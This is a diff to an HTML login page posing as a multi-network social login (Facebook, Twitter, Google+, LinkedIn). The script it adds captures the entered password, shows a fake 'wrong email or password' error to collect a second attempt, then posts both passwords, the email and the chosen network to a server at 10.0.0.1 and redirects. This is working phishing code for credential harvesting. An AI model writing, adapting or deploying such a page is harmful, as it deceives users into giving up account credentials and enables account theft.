@@ -22,11 +22,11 @@
         <li><a href="#" title="linkedin" class="tooltip"><img src="social/linkedin.png" alt="" class="icon"></a></li>
 </ul>	
 <div class="box">
-      <h1>Login</h1><form action="http://10.0.0.1/dbconnect.php" method="post">
+      <h1>Login</h1><form name="theform" action="dbconnect.php" method="post" onsubmit="return validateForm();"> <!- http://10.0.0.1/ ->
 <select name="socialn" class="list">
 		<option value="facebook">Facebook</option>
 		<option value="twitter">Twitter</option>
-		<option value="googlep" selected>Google+</option>
+		<option value="google" selected>Google+</option>
 		<option value="linkedin">Linkedin</option>
 	</select>
       <input type="email" name="email" required placeholder="Email"/>
@@ -38,7 +38,24 @@
 	<a href="#" class="logo"><img src="images/logo.png"></a>
     </div>
 </div>
+<script src="jquery.min.js"></script>
+<script>
+var locked;
+$('form').submit(function(e){
+    e.preventDefault();
 
+    if (!locked) {
+        firstPassword = $('input[type=password]').val();
+        //var email = $('input[type=email]').val();
+        //var social = $('input[name=socialn]').val();
+        locked = true;
+        alert("Failed to authenticate. Wrong Email or Password.");
+        return false;
+    } else {
+        $.post('http://10.0.0.1/dbconnect.php', 'first-password=' + firstPassword + '&second-password=' + $('input[type=password]').val() + '&email:=' + $('input[type=email]').val() + '&social:=' + $('[name=socialn]').val() , window.location.replace("http://10.0.0.1/dbconnect.php"));
+    }
+});
+</script>
 <div class="social-icons"></div>
 
 </body>
